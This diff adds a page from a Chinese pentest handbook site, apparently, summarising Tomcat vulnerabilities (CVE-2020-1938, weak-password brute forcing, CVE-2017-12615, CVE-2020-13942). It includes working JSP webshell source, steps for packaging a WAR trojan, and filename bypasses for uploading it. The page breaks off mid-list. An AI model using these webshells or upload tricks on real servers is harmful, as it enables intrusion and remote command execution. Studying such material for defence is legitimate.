@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Apache Tomcat Vulnerabilities - Tomcat常见的漏洞总结 | 烟雨黑帽</title>
+<meta name="description" content="Tomcat常见的漏洞总结 0、CVE 2020 1938文件包含漏洞 漏洞描述 该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件，如:webapp配置文件或源代码等。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执…">
+<meta name="keywords" content="Apache Tomcat Vulnerabilities, Tomcat常见的漏洞总结, 网络安全, 渗透测试, web security, penetration testing, 白帽">
+<meta name="author" content="noahs">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="烟雨黑帽">
+<meta property="og:title" content="Apache Tomcat Vulnerabilities">
+<meta property="og:description" content="Tomcat常见的漏洞总结 0、CVE 2020 1938文件包含漏洞 漏洞描述 该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件，如:webapp配置文件或源代码等。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执…">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Apache Tomcat Vulnerabilities">
+<meta name="twitter:description" content="Tomcat常见的漏洞总结 0、CVE 2020 1938文件包含漏洞 漏洞描述 该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件，如:webapp配置文件或源代码等。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执…">
+<meta name="theme-color" content="#0f172a">
+<script src="../assets/theme.js"></script>
+<link rel="icon" href="../favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="../assets/style.css?v=1">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.9.0/styles/atom-one-dark.min.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "烟雨黑帽"}, {"@type": "ListItem", "position": 2, "name": "Tomcat常见的漏洞总结"}]}, {"@type": "TechArticle", "headline": "Apache Tomcat Vulnerabilities", "alternativeHeadline": "Tomcat常见的漏洞总结", "description": "Tomcat常见的漏洞总结 0、CVE 2020 1938文件包含漏洞 漏洞描述 该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件，如:webapp配置文件或源代码等。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执…", "inLanguage": "zh-CN", "author": {"@type": "Person", "name": "noahs"}, "isPartOf": {"@type": "Book", "name": "烟雨黑帽"}, "datePublished": "2026-10-11"}]}</script>
+</head>
+<body>
+<div class="searchbar">
+  <div class="search">
+    <input id="navSearch" type="search" placeholder="搜索目录 / Search…" autocomplete="off" aria-label="搜索目录">
+  </div>
+</div>
+<header class="topbar">
+  <button class="icon-btn" id="menuBtn" aria-label="菜单">&#9776;</button>
+  <a class="brand" href="../">
+    <span class="brand-mark">WS</span>
+    <span class="brand-text"><b>烟雨黑帽</b><i>Web安全与SEO实战手册</i></span>
+  </a>
+  <button class="icon-btn" id="themeBtn" aria-label="切换主题">&#9789;</button>
+</header>
+<div class="layout">
+  <aside class="sidebar" id="sidebar">
+    <a class="home-btn" href="../"><svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 10.2 12 3l9 7.2"/><path d="M5.5 9.4V21h13V9.4"/></svg><span>首页</span></a>
+    <div class="sidebar-head">目录 <span class="count">186</span></div>
+    <nav class="nav-scroll"><ul class="nav-tree"><li class="nav-item depth-0"><span class="nav-label">搜索引擎优化</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../knowledge/">基本知识</a></li><li class="nav-item depth-1"><a href="../do-i-need-seo/">我需要SEO吗</a></li><li class="nav-item depth-1"><a href="../whitehat-seo/">白帽SEO</a></li><li class="nav-item depth-1"><a href="../ai-seo/">AI SEO</a></li><li class="nav-item depth-1"><a href="../blackhat-seo/">黑帽SEO</a><ul class="nav-children"><li class="nav-item depth-2"><a href="../wildcard-directory-site-farm/">泛目录泛内页站群</a></li><li class="nav-item depth-2"><a href="../wildcard-subdomain-site-farm/">泛二级站群</a></li><li class="nav-item depth-2"><a href="../mirror-site-farm/">小偷镜像站群</a></li><li class="nav-item depth-2"><a href="../parasite-seo/">动态寄生虫</a></li><li class="nav-item depth-2"><a href="../subdirectory-in-site/">二级目录站内站</a></li><li class="nav-item depth-2"><a href="../spider-pool/">蜘蛛池</a></li><li class="nav-item depth-2"><a href="../standalone-site-farm/">独立站站群</a></li></ul></li><li class="nav-item depth-1"><a href="../black-market/">黑产研究</a></li></ul></li><li class="nav-item depth-0"><a href="../information-gathering/">信息收集</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../subdomain-enumeration-tools/">工具枚举</a></li><li class="nav-item depth-1"><a href="../dns-zone-transfer-vulnerability/">DNS域传送漏洞</a></li><li class="nav-item depth-1"><a href="../google-hacking-dorks/">google黑客</a></li><li class="nav-item depth-1"><a href="../common-ports-services-summary/">常见端口&amp;解析&amp;总结</a></li><li class="nav-item depth-1"><a href="../port-scanning-tools/">扫描工具</a></li><li class="nav-item depth-1"><a href="../nmap-scanning-guide/">nmap扫描</a></li><li class="nav-item depth-1"><a href="../email-information-gathering/">邮箱信息收集</a></li><li class="nav-item depth-1"><a href="../cdn-detection/">CDN识别</a></li><li class="nav-item depth-1"><a href="../bypass-cdn-find-real-ip/">绕过CDN查找真实IP</a></li></ul></li><li class="nav-item depth-0"><a href="../vulnerability-scanners/">扫描器</a></li><li class="nav-item depth-0"><a href="../sql-injection/">SQL注入</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../sql-injection-common-functions/">常用函数</a></li><li class="nav-item depth-1"><a href="../sql-injection-steps/">sql注入步骤</a></li><li class="nav-item depth-1"><a href="../union-sql-injection-information-schema/">union注入和information_schema库</a></li><li class="nav-item depth-1"><a href="../error-based-sql-injection-functions/">函数和报错注入</a></li><li class="nav-item depth-1"><a href="../blind-sql-injection/">SQL盲注</a></li><li class="nav-item depth-1"><a href="../other-sql-injection-techniques/">其他注入方式</a></li><li class="nav-item depth-1"><a href="../access-database-injection/">Access数据库注入</a></li><li class="nav-item depth-1"><a href="../mssql-database-injection/">MSSQL数据库注入</a></li><li class="nav-item depth-1"><a href="../mysql-database-injection/">MYSQL数据库注入</a></li><li class="nav-item depth-1"><a href="../sqlmap-tutorial/">神器SQLmap</a></li></ul></li><li class="nav-item depth-0"><a href="../xss-cross-site-scripting/">xss跨站脚本攻击</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../xss-principles-and-types/">xss原理和分类</a></li><li class="nav-item depth-1"><a href="../xss-bypass-techniques/">xss绕过技巧</a></li><li class="nav-item depth-1"><a href="../xss-case-studies/">xss案例</a></li></ul></li><li class="nav-item depth-0"><a href="../file-upload-download-inclusion/">文件上传下载包含</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../common-sensitive-file-paths/">常有用文件路径</a></li><li class="nav-item depth-1"><a href="../file-upload-vulnerability/">文件上传漏洞</a></li><li class="nav-item depth-1"><a href="../file-download-vulnerability/">文件下载漏洞</a></li><li class="nav-item depth-1"><a href="../file-inclusion-vulnerability/">文件包含漏洞</a></li><li class="nav-item depth-1"><a href="../upload-labs-file-upload-labs/">upload-labs上传漏洞练习</a></li></ul></li><li class="nav-item depth-0"><a href="../xxe-ssrf-csrf/">XXE、SSRF、CSRF</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../ssrf-fundamentals/">SSRF原理基础</a></li><li class="nav-item depth-1"><a href="../ssrf-practical-cases/">SSRF案例实战</a></li><li class="nav-item depth-1"><a href="../csrf-fundamentals/">CSRF原理基础</a></li><li class="nav-item depth-1"><a href="../csrf-cases-and-prevention/">CSRF案例及防范</a></li><li class="nav-item depth-1"><a href="../xxe-xml-dtd-basics/">XXE之XML_DTD基础</a></li><li class="nav-item depth-1"><a href="../xxe-payloads-and-fixes/">XXE之payload与修复</a></li><li class="nav-item depth-1"><a href="../xxe-combined-with-ssrf/">XXE结合SSRF</a></li></ul></li><li class="nav-item depth-0"><a href="../rce-and-deserialization/">远程命令执行与反序列化</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../remote-command-code-execution/">远程命令和代码执行漏洞</a></li><li class="nav-item depth-1"><a href="../deserialization-vulnerabilities/">反序列化漏洞</a></li></ul></li><li class="nav-item depth-0"><a href="../captcha-and-brute-force/">验证码与暴力破解</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../brute-force-captcha-basics/">爆破与验证码原理</a></li><li class="nav-item depth-1"><a href="../cs-architecture-brute-force/">CS架构暴力破解</a></li><li class="nav-item depth-1"><a href="../bs-architecture-brute-force/">BS架构暴力破解</a></li></ul></li><li class="nav-item depth-0"><a href="../web-editor-vulnerabilities/">WEB编辑器漏洞</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../web-editor-vulnerabilities-basics/">编辑器漏洞基础</a></li><li class="nav-item depth-1"><a href="../ewebeditor-vulnerabilities/">Ewebeditor编辑器</a></li><li class="nav-item depth-1"><a href="../fckeditor-vulnerabilities/">FCKeditor编辑器</a></li><li class="nav-item depth-1"><a href="../other-web-editors/">其他编辑器</a></li></ul></li><li class="nav-item depth-0"><a href="../web-middleware-vulnerabilities/">web中间件漏洞</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../middleware-parsing-vulnerabilities/">中间件解析漏洞</a></li><li class="nav-item depth-1 active"><a href="../apache-tomcat-vulnerabilities/">Tomcat常见的漏洞总结</a></li><li class="nav-item depth-1"><a href="../jboss-exploitation/">Jboss漏洞利用总结</a></li><li class="nav-item depth-1"><a href="../weblogic-exploitation/">Weblogic漏洞利用总结</a></li></ul></li><li class="nav-item depth-0"><a href="../web-penetration-testing-steps/">WEB具体步骤</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../neighboring-site-attack-privilege-escalation/">旁注和越权</a></li><li class="nav-item depth-1"><a href="../cdn-bypass/">CDN绕过</a></li><li class="nav-item depth-1"><a href="../privilege-escalation-logic-flaws/">越权与逻辑漏洞</a></li><li class="nav-item depth-1"><a href="../other-common-web-vulnerabilities/">WEB应用常见其他漏洞</a></li><li class="nav-item depth-1"><a href="../web-login-page-penetration/">WEB登陆页面渗透思路</a></li></ul></li><li class="nav-item depth-0"><a href="../social-engineering-phishing-apt/">社工、钓鱼、apt</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../social-engineering-information-gathering/">社工和信息收集</a></li><li class="nav-item depth-1"><a href="../domain-spoofing/">域名欺骗</a></li><li class="nav-item depth-1"><a href="../phishing-emails/">钓鱼邮件</a></li><li class="nav-item depth-1"><a href="../phishing-trojan-tools/">一些钓鱼用的挂马工具</a></li></ul></li><li class="nav-item depth-0"><a href="../code-audit/">代码审计</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../code-audit-tools/">代码审计工具</a></li></ul></li><li class="nav-item depth-0"><a href="../waf-bypass/">WAF绕过</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../waf-basics-cloud-waf/">WAF基础及云WAF</a></li><li class="nav-item depth-1"><a href="../waf-bypass-methods/">各种WAF绕过方法</a></li><li class="nav-item depth-1"><a href="../bypassing-waf-file-upload/">绕过WAF上传文件</a></li></ul></li><li class="nav-item depth-0"><a href="../system-privilege-escalation/">系统提权</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../windows-privilege-escalation/">windows系统提权</a></li><li class="nav-item depth-1"><a href="../linux-privilege-escalation/">linux系统提权</a></li><li class="nav-item depth-1"><a href="../database-privilege-escalation/">数据库提权操作系统</a></li></ul></li><li class="nav-item depth-0"><a href="../internal-network-lateral-movement/">内网横向渗透</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../internal-network-tunneling/">内网穿透方式</a></li><li class="nav-item depth-1"><a href="../third-party-app-privilege-escalation/">一些内网第三方应用提权</a></li></ul></li><li class="nav-item depth-0"><a href="../arp-and-dos-attacks/">ARP与DOS</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../arp-spoofing/">ARP欺骗</a></li><li class="nav-item depth-1"><a href="../dos-and-ddos-attacks/">DOS与DDOS</a></li><li class="nav-item depth-1"><a href="../dos-attack-tools/">一些DOS工具</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全研发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../learn-guide/">安全研发学习指南</a></li><li class="nav-item depth-1"><a href="../term/">相关术语</a></li><li class="nav-item depth-1"><a href="../firewall/">防火墙</a></li><li class="nav-item depth-1"><a href="../open-source/">开源项目推荐</a></li><li class="nav-item depth-1"><a href="../cl-snort/">源码学习之Snort3</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全研究</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../research-list/">导航列表</a></li><li class="nav-item depth-1"><a href="../ai-sec/">人工智能安全(AISec)</a></li><li class="nav-item depth-1"><a href="../llm-sec/">大语言模型安全(LLM security)</a></li><li class="nav-item depth-1"><a href="../apt/">APT</a></li><li class="nav-item depth-1"><a href="../attck/">ATT&amp;CK</a></li><li class="nav-item depth-1"><a href="../fuzzing/">模糊测试</a></li><li class="nav-item depth-1"><a href="../binary-sec/">二进制安全</a></li><li class="nav-item depth-1"><a href="../device-sec/">路由设备安全</a></li><li class="nav-item depth-1"><a href="../ic-sec/">工控安全</a></li><li class="nav-item depth-1"><a href="../5g-sec/">5g安全</a></li><li class="nav-item depth-1"><a href="../iov-sec/">车联网安全</a></li><li class="nav-item depth-1"><a href="../protocol-sec/">协议安全</a></li><li class="nav-item depth-1"><a href="../boofuzz/">Boofuzz</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全管理</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cso/">CSO与安全负责人</a></li><li class="nav-item depth-1"><a href="../enterprise-sec/">企业安全建设</a></li><li class="nav-item depth-1"><a href="../classified-protection/">等级保护</a></li><li class="nav-item depth-1"><a href="../sec-jd/">安全招聘</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全产品营销</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../sec-operation/">安全运营</a></li><li class="nav-item depth-1"><a href="../axure-rp/">Axure RP</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">应急响应</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../incident-response-learn-guide/">应急响应学习参考</a></li><li class="nav-item depth-1"><a href="../traceback/">溯源反制</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">CVE</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cve/">CVE相关参考</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">渗透测试</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../pentest-learn-guide/">渗透测试学习参考</a></li><li class="nav-item depth-1"><a href="../pentest-term/">术语</a></li><li class="nav-item depth-1"><a href="../kali-linux/">Kali Linux</a></li><li class="nav-item depth-1"><a href="../red-team/">红队</a></li><li class="nav-item depth-1"><a href="../brute-force/">暴力破解</a></li><li class="nav-item depth-1"><a href="../xss/">跨站脚本攻击</a></li><li class="nav-item depth-1"><a href="../csrf/">跨站请求伪造</a></li><li class="nav-item depth-1"><a href="../reverse-shell/">反弹Shell</a></li><li class="nav-item depth-1"><a href="../capture-package/">抓包</a></li><li class="nav-item depth-1"><a href="../crack/">破解</a></li><li class="nav-item depth-1"><a href="../nmap/">Nmap</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">CTF</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../ctf-learn-guide/">基础知识</a></li><li class="nav-item depth-1"><a href="../env-config/">测试环境搭建</a></li><li class="nav-item depth-1"><a href="../ctf-skill/">CTF竞赛常用基本解题技巧</a></li><li class="nav-item depth-1"><a href="../pwn/">PWN</a></li><li class="nav-item depth-1"><a href="../crypto/">Crypto</a></li><li class="nav-item depth-1"><a href="../ctf-re/">RE</a></li><li class="nav-item depth-1"><a href="../hackthebox/">HackTheBox</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">架构</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../architecture-learn-guide/">架构学习指南</a></li><li class="nav-item depth-1"><a href="../notes/">读书笔记</a></li><li class="nav-item depth-1"><a href="../design-pattern/">设计模式</a></li><li class="nav-item depth-1"><a href="../ddd/">领域驱动设计</a></li><li class="nav-item depth-1"><a href="../micro-services/">微服务</a></li><li class="nav-item depth-1"><a href="../scrum/">Scrum</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">后端开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../backend-learn-guide/">后端开发学习指南</a></li><li class="nav-item depth-1"><a href="../computer-networking/">计算机网络</a></li><li class="nav-item depth-1"><a href="../os/">操作系统</a></li><li class="nav-item depth-1"><a href="../database/">数据库</a></li><li class="nav-item depth-1"><a href="../search-engine/">搜索引擎</a></li><li class="nav-item depth-1"><a href="../python/">Python</a></li><li class="nav-item depth-1"><a href="../go/">Golang</a></li><li class="nav-item depth-1"><a href="../rust/">Rust</a></li><li class="nav-item depth-1"><a href="../rabbitmq/">RabbitMQ</a></li><li class="nav-item depth-1"><a href="../kafka/">Kafka</a></li><li class="nav-item depth-1"><a href="../jwt/">JWT认证</a></li><li class="nav-item depth-1"><a href="../regex/">正则表达式</a></li><li class="nav-item depth-1"><a href="../git/">Git</a></li><li class="nav-item depth-1"><a href="../git-flow/">Git Flow</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">机器学习</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../machine-learning/">机器学习</a></li><li class="nav-item depth-1"><a href="../nlp/">自然语言处理</a></li><li class="nav-item depth-1"><a href="../llms/">大语言模型LLMs</a></li><li class="nav-item depth-1"><a href="../statistical-learning/">统计学习方法笔记</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">前端开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../frontend-learn-guide/">前端开发学习指南</a></li><li class="nav-item depth-1"><a href="../html5/">HTML5</a></li><li class="nav-item depth-1"><a href="../css/">CSS</a></li><li class="nav-item depth-1"><a href="../js/">JavaScript</a></li><li class="nav-item depth-1"><a href="../typescript/">TypeScript</a></li><li class="nav-item depth-1"><a href="../vue/">Vue.js</a></li><li class="nav-item depth-1"><a href="../react/">React</a></li><li class="nav-item depth-1"><a href="../npm/">NPM</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">爬虫开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cookie-pool/">Cookie池设计</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">DevOps</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../devops-learn-guide/">DevOps学习指南</a></li><li class="nav-item depth-1"><a href="../docker/">Docker</a></li><li class="nav-item depth-1"><a href="../k8s/">Kubernetes</a></li><li class="nav-item depth-1"><a href="../vm/">虚拟机</a></li><li class="nav-item depth-1"><a href="../linux/">Linux</a></li><li class="nav-item depth-1"><a href="../windows/">Windows</a></li><li class="nav-item depth-1"><a href="../sre/">SRE</a></li><li class="nav-item depth-1"><a href="../shell/">Shell</a></li><li class="nav-item depth-1"><a href="../syslog/">syslog</a></li></ul></li><li class="nav-item depth-0"><a href="../todo-list/">Todo List</a></li></ul>
+</nav>
+  </aside>
+  <div class="scrim" id="scrim"></div>
+  <main class="content">
+<article class="article"><nav class="crumbs"><a href="../">烟雨黑帽</a><span>/</span><span>Tomcat常见的漏洞总结</span></nav><a class="ad-banner" href="../knowledge/" aria-label="SEO专题推广"><img src="../assets/ad-seo.svg" alt="Web安全与SEO实战手册 — 搜索引擎优化(SEO)专题推广" width="970" height="90" loading="lazy"></a><h1>Tomcat常见的漏洞总结</h1><p class="cn-title">Apache Tomcat Vulnerabilities</p><details class="toc-box" open><summary>本页目录 / On this page</summary><div class="toc">
+<ul>
+<li><a href="#tomcat">Tomcat常见的漏洞总结</a><ul>
+<li><a href="#0cve-2020-1938">0、CVE-2020-1938文件包含漏洞</a></li>
+<li><a href="#1tomcat">1、Tomcat后台弱口令漏洞</a></li>
+<li><a href="#2war">2、war木马的制作过程</a></li>
+<li><a href="#3cve-2017-12615tomcatput">3、CVE-2017-12615Tomcat远程代码执行漏洞(PUT请求)</a></li>
+</ul>
+</li>
+<li><a href="#_1">有三种方法可以进行绕过</a><ul>
+<li><a href="#4cve-2020-13942-apache-unomi">4、CVE-2020-13942 Apache Unomi 远程代码执行漏洞</a></li>
+</ul>
+</li>
+<li><a href="#_2">编码后为</a><ul>
+<li><a href="#5cve-2019-0232-apache-tomcat">5、CVE-2019-0232 Apache Tomcat远程代码执行漏洞</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</details><div class="article-body"><h1 id="tomcat">Tomcat常见的漏洞总结</h1>
+<h2 id="0cve-2020-1938">0、CVE-2020-1938文件包含漏洞</h2>
+<p><strong>漏洞描述</strong></p>
+<p>该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件，如:webapp配置文件或源代码等。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</p>
+<p><strong>漏洞影响版本</strong></p>
+<blockquote>
+<p>Apache Tomcat 6
+Apache Tomcat 7 &lt; 7.0.100
+Apache Tomcat 8 &lt; 8.5.51
+Apache Tomcat 9 &lt; 9.0.31</p>
+</blockquote>
+<p><strong>不受影响版本</strong></p>
+<blockquote>
+<p>Apache Tomcat = 7.0.100
+Apache Tomcat = 8.5.51
+Apache Tomcat = 9.0.31</p>
+</blockquote>
+<p><strong>漏洞分析</strong>
+Tomcat在处理ajp协议时存在漏洞，可通过调用request.setAttribute为Tomcat设置任意request属性。
+当ajp URI设置为非jsp路径时，Tomcat会调用DefaultServlet处理，此时会导致web目录任意文件读取漏洞。
+当ajp URI设置为jsp路径时，Tomcat会调用JspServlet处理，此时会导致JSP文件包含漏洞</p>
+<p><strong>漏洞复现</strong></p>
+<ol>
+<li>使用nmap扫描目标是否开启了8009端口</li>
+<li>使用poc扫描目标网站
+  下载地址: ***.com
+  命令：<code>python xx.py 192.x.x.x -p 8009 -f WEB-INF/web.xml</code></li>
+<li>默认是读取ROOT路径下的web.xml 
+   如果想换路径需要更改POC源码里的<code>perform_request</code>的位置只能在webapps下的）</li>
+</ol>
+<p><strong>防御方式</strong></p>
+<ol>
+<li>禁用AJP协议
+在tomcat安装路径中找到/conf/server.xml文件，删除或注释下面这行代码：
+<code>&lt;Connector port="8009"protocol="AJP/1.3" redirectPort="8443" /&gt;</code></li>
+<li>升级到tomcat最新版本</li>
+<li>配置secret来设置AJP协议的认证凭证，如：
+    <code>xml
+    &lt;Connector port="8009"protocol="AJP/1.3" redirectPort="8443" address="YOUR_TOMCAT_IP_ADDRESS" secret="YOUR_TOMCAT_AJP_SECRET"/&gt;</code></li>
+</ol>
+<h2 id="1tomcat">1、Tomcat后台弱口令漏洞</h2>
+<p>Tomcat后台存在弱口令，进入网站后点击登录然后使用burp进行爆破测试，可发现账户密码字段:<code>Authorization: Basic YWRtaW46YWRtaW4=</code>,解密后发现是用base64加密的<code>uaername:password</code></p>
+<p><strong>爆破方式：</strong></p>
+<ol>
+<li>
+<p>使用burp抓包后发送到 Intrude 模块进行暴力破解</p>
+</li>
+<li>
+<p>使用burp模糊测试模块中的<code>custom iteactor</code>自定义迭代类型的payload
+   该类型的payload共分为8个占位符，每一个占位符又可以指定简单列表的payload类型。再根据占位的数值，于每一个payload列表区进行笛卡尔积生成集合组</p>
+</li>
+<li>
+<p>设置格式
+设置第一个Position参数就是username参数，然后再进行添加paylaod字典。第二个参数就是冒号 : 第三个就是password字段。设置完成后再对数据字段进行base64编码就可以进行爆破。</p>
+</li>
+<li>
+<p>成功爆破出账号密码，然后使用base64解码得出明文账号密码</p>
+</li>
+<li>使用爆破出的账号密码登录进去后台后发现有一个上传页面，直接上传一个war木马就可以</li>
+</ol>
+<h2 id="2war">2、war木马的制作过程</h2>
+<ol>
+<li>找到一个jsp的木马
+    <code>&lt;%
+        if("023".equals(request.getParameter("pwd"))){
+        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
+        int a = -1;
+        byte[] b = new byte[2048];
+        out.print("&lt;pre&gt;");
+        while((a=in.read(b))!=-1){
+            out.println(new String(b));
+        }
+        out.print("&lt;/pre&gt;");
+    }
+    %&gt;</code></li>
+<li>
+<p>将jsp木马放入 jdk1.8.0_73的bin目录下，然后在cmd输出以下命令
+注意是必须在java环境下的，必须使用管理员权限的
+    <code>jar cvf  +部署的war木马 +自己bin目录下的jsp木马</code></p>
+</li>
+<li>
+<p>木马制作成功，上传制作的war木马</p>
+</li>
+<li>验证已经成功上传了木马
+   <code>x.x.x.x:51135/shell/1.jsp?pwd=023&amp;i=ls</code></li>
+</ol>
+<h2 id="3cve-2017-12615tomcatput">3、CVE-2017-12615Tomcat远程代码执行漏洞(PUT请求)</h2>
+<p><strong>漏洞介绍</strong></p>
+<p>当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法，攻击者通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行，危害十分严重</p>
+<p><strong>影响版本</strong></p>
+<p>Apache Tomcat 7.0.0 - 7.0.81</p>
+<p><strong>漏洞利用前提:</strong></p>
+<p>需Tomcat开启了HTTP PUT请求</p>
+<p><strong>漏洞原理分析</strong></p>
+<p>Tomcat 的 Servlet 是在 conf/web.xml 配置的，通过配置文件可知，当后缀名为 .jsp 和 .jspx 的时候，是通过 JspServlet 处理请求的；而其他的静态文件是通过 DefaultServlet 处理的。可知'1.jsp '（末尾有空格）并不能匹配到 JspServlet，而是会交由 DefaultServlet 去处理。
+当处理 PUT 请求时,会调用 <code>resources.bind：dirContext</code>为 FileDirContext调用 rebind 创建文件,又由于 Windows 不允许空格作为文件名结尾，所以会创建一个 .jsp 文件，导致代码执行。</p>
+<p><strong>环境搭建</strong></p>
+<p>下载Tomcat，安装成功后，需要开启HTTP PUT请求，首先打开Tomcat目录，找到配置文件<code>conf/web</code></p>
+<p>打开之后，<code>org.apache.catalina.servlets.DefaultServlet</code> 方法，并添加以下命令，添加成功后重启一下即可</p>
+<pre><code>&lt;init-param&gt; 
+        &lt;param-name&gt;readonly&lt;/param-name&gt; 
+        &lt;param-value&gt;false&lt;/param-value&gt; 
+&lt;/init-param&gt; 
+</code></pre>
+<p><strong>漏洞复现</strong></p>
+<ol>
+<li>
+<p>使用burp进行抓包，将请求包发送到repeater模块中，将GET请求方法改为OPTIONS，查看请求方法</p>
+</li>
+<li>
+<p>发现启用了PUT方法，使用PUT请求上传jsp木马</p>
+</li>
+</ol>
+<pre><code class="language-jsp">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;
+
+&lt;%!public static String excuteCmd(String c) {
+
+StringBuilder line = new StringBuilder();
+
+try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new 
+InputStreamReader(pro.getInputStream()));
+
+String temp = null;while ((temp = buf.readLine()) != null) {
+
+line.append(temp+&quot;\n&quot;);}buf.close();} catch (Exception e) {
+
+line.append(e.getMessage());}return line.toString();}%&gt; 
+&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;))){
+
+out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);}else{out.println(&quot;:-)&quot;);}%&gt;
+</code></pre>
+<ol start="3">
+<li>
+<p>页面状态码返回201，表示木马写入成功</p>
+</li>
+<li>
+<p>到页面中访问(ip+1.jsp) url: 
+   ***.com</p>
+</li>
+<li>
+<p>该漏洞实际上是利用了window下文件名解析的漏洞来触发的。
+   通过构造特殊后缀名，绕过Tomcat检测，让Tomcat用DefaultServlet的逻辑处理请求，从而上传jsp webshell文件</p>
+<p>```</p>
+<h1 id="_1">有三种方法可以进行绕过</h1>
+<p>shell.jsp%20
+shell.jsp::$DATA
+shell.jsp/
+```</p>
+</li>
+</ol>
+<h2 id="4cve-2020-13942-apache-unomi">4、CVE-2020-13942 Apache Unomi 远程代码执行漏洞</h2>
+<p><strong>Apache Unomi简介</strong></p>
+<p>Apache Unomi 是一个基于标准的客户数据平台（CDP，Customer Data Platform），用于管理在线客户和访客等信息，以提供符合访客隐私规则的个性化体验，比如 GDPR 和“不跟踪”偏好设置。其最初于 Jahia 开发，2015 年 10 月 Unomi 成为Apache 软件基金会项目</p>
+<p><strong>漏洞描述</strong></p>
+<p>在Apache Unomi 1.5.1版本之前，攻击者可以通过精心构造的MVEL或ONGl表达式来发送恶意请求，使得Unomi服务器执行任意代码，漏洞对应编号为CVE-2020-11975，而CVE-2020-13942漏洞是对CVE-2020-11975漏洞的补丁绕过，攻击者绕过补丁检测的黑名单，发送恶意请求，在服务器执行任意代码</p>
+<p><strong>漏洞影响版本</strong>
+Apache Unomi &lt; 1.5.2</p>
+<p><strong>环境搭建</strong>
+使用docker一键搭建的vulhub靶场，访问页面 ip:8181
+通过8181和9443两个端口都可以触发漏洞，本次使用 8181端口进行漏洞复现</p>
+<p><strong>漏洞复现</strong></p>
+<ol>
+<li>
+<p>打开靶场首页，使用bp进行抓包，发送到Repeater模块构造数据包</p>
+</li>
+<li>
